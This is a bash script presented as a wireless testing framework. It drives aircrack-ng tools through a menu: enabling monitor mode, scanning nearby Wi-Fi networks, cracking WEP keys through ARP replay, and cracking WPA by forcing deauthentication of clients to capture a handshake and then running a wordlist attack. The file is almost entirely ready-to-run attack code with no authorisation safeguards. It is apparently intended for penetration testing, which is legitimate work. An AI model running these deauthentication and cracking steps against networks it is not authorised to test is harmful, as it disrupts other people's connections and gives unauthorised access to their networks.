#!/usr/bin/env bash

# by Lee Baird @discoverscripts

set -euo pipefail

trap cleanup EXIT

# Global Variables
interface=""
monitor=""
pid_aireplay=""
pid_airodump=""
scanfile="$HOME/scan_results"
workdir="$HOME/wifi-engagement"

BLUE='\033[1;34m'
GREEN='\033[0;32m'
RED='\033[1;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

banner(){
    clear
    echo
    echo -e "${YELLOW}
__          __  _________   _________
\ \        / / |___   ___| |  _______|
 \ \  /\  / /      | |     | |____
  \ \/  \/ /       | |     |  ____|
   \  /\  /        | |     | |
    \/  \/         |_|     |_|

        Wireless Testing Framework

              By Lee Baird${NC}"
    echo
    echo
}

dependencies() {
    # Initialize an array to hold missing tools
    missing_tools=()

    # Check for tools
    for tool in aircrack-ng aireplay-ng airmon-ng airodump-ng xterm; do
        if ! command -v "$tool" &> /dev/null; then
            missing_tools+=("$tool")
        fi
    done

    # Display missing tools
    if [ ${#missing_tools[@]} -ne 0 ]; then
        echo
        echo -e "${RED}[!] Missing tools: ${missing_tools[*]}${NC}"
        echo
        exit 1
    fi

    echo -e "${BLUE}[*] Required tools installed.${NC}"

    # Check for wireless interface
    interface=$(iw dev | awk '$1=="Interface"{print $2}' || true)

    if [ -z "$interface" ]; then
        echo
        echo -e "${RED}[!] No wireless device found.${NC}"
        echo
        echo "Please check if your wireless adapter is connected or enabled."
        echo
        exit 1
    fi
}

start_monitor_mode() {
    # Validate interface availability before enabling monitor mode
    interface=$(iw dev | awk '$1=="Interface"{print $2}' || true)
    if [ -z "$interface" ]; then
        echo
        echo -e "${RED}[!] No wireless device found. Unable to enable monitor mode.${NC}"
        echo
        echo "Check if your wireless adapter is connected and enabled."
        echo
        exit 1
    fi

    # Kill interfering processes (NetworkManager, wpa_supplicant)
    airmon-ng check kill

    echo -e "${BLUE}[*] Enabling monitor mode.${NC}"

    # Enable monitor mode on the interface
    airmon-ng start "$interface" | sed '/^$/d'

    # Wait a moment to ensure the interface switches to monitor mode
    sleep 2

    # Check if the interface is now in monitor mode using iwconfig
    mode=$(iwconfig "$interface" 2>/dev/null | grep "Mode:Monitor")

    if [ -z "$mode" ]; then
        echo
        echo -e "${RED}[!] Failed to enable monitor mode on interface: $interface.${NC}"
        echo
        exit 1
    else
        monitor="$interface"  # Keep using the same interface name
        echo -e "${BLUE}[*] Monitor mode enabled on interface:${NC} ${GREEN}$monitor${NC}"
    fi

    echo
    echo -e "${YELLOW}Press <Enter> to continue.${NC}"
    read -r
    banner; main_menu
}

if [ ! -d "$workdir" ]; then
    mkdir -p "$workdir"
fi

scan_networks() {
    echo
    echo -e "${YELLOW}[*] Scanning for wireless networks.${NC}"

    # Clear any previous results
    rm -f "${scanfile}"*

    # Ensure monitor interface is being used
    echo -e "${BLUE}[*] Using monitor interface:${NC} ${GREEN}$monitor${NC}"

    # Use the detected monitor interface for airodump-ng
    airodump-ng --output-format csv -w "$scanfile" "$monitor" &> "$workdir/airodump.log" &
    pid_airodump=$!

    # Increase sleep time to capture more data
    sleep 30

    # Check if the process is still running before trying to kill it
    if kill -0 "$pid_airodump" &>/dev/null; then
        kill "$pid_airodump"
    else
        echo -e "${RED}[!] airodump-ng process is not running.${NC}"
    fi

    # Check if the scan file exists
    if [ -f "${scanfile}-01.csv" ]; then
        echo
        echo -e "${BLUE}[*] Scan complete. Networks saved to ${scanfile}-01.csv.${NC}"
        echo
        echo -e "${YELLOW}[*] Displaying results:${NC}"
        awk -F, 'NR > 2 && $1 ~ /[0-9a-fA-F:]/ {print "BSSID: " $1, " | Channel: " $4, " | Encryption: " $6, " | ESSID: " $14}' "${scanfile}-01.csv" | column -t
    else
        echo
        echo -e "${RED}[!] No wireless networks found or failed to write data.${NC}"
        echo
        echo -e "${YELLOW}Check $workdir/airodump.log for errors.${NC}"
    fi
    
    echo
    echo -e "${YELLOW}Press <Enter> to continue.${NC}"
    read -r
    banner; main_menu
}

crack_wep() {
    echo
    echo -e "${YELLOW}[*] Letting airodump-ng run to find a WEP target.${NC}"
    airodump-ng --encrypt WEP "$monitor"
    echo
    echo -n "BSSID of the WEP network: "
    read -r bssid
    echo -n "Channel of the WEP network: "
    read -r channel
    echo -n "Client MAC address (optional for ARP replay): "
    read -r client

    if [ -z "$bssid" ] || [ -z "$channel" ]; then
        echo
        echo -e "${RED}[!] BSSID or Channel cannot be empty.${NC}"
        echo
        exit 1
    fi

    if [ -z "$client" ]; then
        client="ff:ff:ff:ff:ff:ff"
    fi

    xterm -e "airodump-ng --bssid $bssid --channel $channel --write wep_capture $monitor" &
    pid_airodump=$!
    sleep 5
    xterm -e "aireplay-ng --arpreplay -b $bssid -h $client $monitor" &
    pid_aireplay=$!

    echo
    echo -e "${BLUE}[+] Gathering data for WEP cracking.${NC}"
    sleep 60  # Capture data
    
    if aircrack-ng -b "$bssid" wep_capture*.cap; then
        echo
        echo -e "${BLUE}[*] WEP cracked successfully.${NC}"
    else
        echo
        echo -e "${RED}[!] WEP cracking failed.${NC}"
        echo
        exit 1
    fi
}

crack_wpa() {
    echo
    echo -e "${YELLOW}[*] Letting airodump-ng run to find a WPA target.${NC}"
    airodump-ng --encrypt WPA "$monitor"
    echo
    echo -n "BSSID of the WPA network: "
    read -r bssid
    echo -n "Channel of the WPA network: "
    read -r channel

    if [ -z "$bssid" ] || [ -z "$channel" ]; then
        echo
        echo -e "${RED}[!] BSSID or Channel cannot be empty.${NC}"
        echo
        exit 1
    fi

    xterm -e "airodump-ng --bssid $bssid --channel $channel --write wpa_capture $monitor" &
    pid_airodump=$!
    sleep 5
    xterm -e "aireplay-ng --deauth 10 -a $bssid $monitor" &
    pid_aireplay=$!

    echo
    echo -e "${BLUE}[*] Capturing handshake for WPA cracking.${NC}"
    sleep 60  # Capture handshake

    if ! aircrack-ng wpa_capture*.cap | grep -q "WPA handshake"; then
        echo
        echo -e "${RED}[!] No WPA handshake found.${NC}"
        echo
        exit 1
    fi

    echo
    echo -n "Enter the path to your wordlist: "
    read -r wordlist

    if [ -z "$wordlist" ]; then
        echo
        echo -e "${RED}[!] No data entered.${NC}"
        echo
        exit 1
    fi

    if [ ! -f "$wordlist" ]; then
        echo
        echo -e "${RED}[!] Wordlist file does not exist.${NC}"
        echo
        exit 1
    fi

    if aircrack-ng -w "$wordlist" wpa_capture*.cap; then
        echo
        echo -e "${BLUE}[*] WPA cracked successfully.${NC}"
        echo
    else
        echo
        echo -e "${RED}[!] WPA cracking failed.${NC}"
        echo
        exit 1
    fi
}

cleanup() {
    # Reset PIDs after killing them
    if [ -n "${pid_airodump:-}" ]; then
        kill "$pid_airodump" &>/dev/null || true
        pid_airodump=""
    fi

    if [ -n "${pid_aireplay:-}" ]; then
        kill "$pid_aireplay" &>/dev/null || true
        pid_aireplay=""
    fi

    # Reset wireless interface
    airmon-ng stop $interface &>/dev/null

    echo
    echo
    echo -e "${BLUE}[*] Cleanup complete.${NC}"
    echo
    exit
}

main_menu() {
    echo -e "${BLUE}[*] Wireless interface:${NC} ${GREEN}$interface${NC}"

    while true; do
        echo
        echo "1. Enable monitor mode"
        echo "2. Scan for networks"
        echo "3. Crack WEP"
        echo "4. Crack WPA"
        echo "5. Exit"
        echo
        echo -n "Choice: "
        read -r choice

        case $choice in
            1) start_monitor_mode ;;
            2) scan_networks ;;
            3) crack_wep ;;
            4) crack_wpa ;;
            5) cleanup ;;
            *) echo; echo -e "${RED}[!] Invalid option, try again.${NC}"; echo; sleep 2;
               banner; main_menu ;;
        esac
    done
}

# Run the script
banner
dependencies
main_menu
